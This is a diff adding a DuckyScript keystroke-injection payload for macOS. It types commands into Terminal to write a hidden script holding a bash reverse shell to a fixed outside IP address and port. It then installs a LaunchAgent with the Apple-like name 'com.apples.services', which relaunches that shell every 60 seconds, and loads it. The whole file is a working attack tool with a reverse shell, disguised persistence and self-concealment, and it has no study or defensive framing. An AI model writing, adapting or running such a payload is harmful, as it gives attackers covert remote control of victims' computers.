@@ -1,0 +1,81 @@
+REM AYOCODE
+DELAY 1000
+GUI SPACE
+STRING terminal
+DELAY 200
+ENTER
+DELAY 200
+STRING mkdir /etc/defaults/.notashell
+ENTER
+STRING echo '
+SHIFT 3
+STRING !/bin/bash
+ENTER
+STRING bash -i >& /dev/tcp/129.21.70.138/5050 0>&1
+ENTER
+STRING wait' > /etc/defaults/.notashell/sheel.sh
+ENTER
+DELAY 200
+STRING chmod +x /etc/defaults/.notashell/sheel.sh
+ENTER
+DELAY 200
+STRING mkdir
+SPACE
+SHIFT `
+STRING /Library/LaunchAgents
+ENTER
+DELAY 200
+STRING echo '<plist version=
+SHIFT '
+STRING 1.0
+SHIFT '
+STRING >
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples.services</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>bash</string>
+ENTER
+STRING <string>/etc/defaults/.notashell/sheel.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>StartInterval</key>
+ENTER
+STRING <integer>60</integer>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' >
+SPACE
+SHIFT `
+STRING /Library/LaunchAgents/com.apples.services.plist
+ENTER
+DELAY 200
+STRING chmod 600 
+SPACE
+SHIFT `
+STRING /Library/LaunchAgents/com.apples.services.plist
+ENTER
+DELAY 200
+STRING launchctl load 
+SPACE
+SHIFT `
+STRING /Library/LaunchAgents/com.apples.services.plist
+ENTER
+GUI q
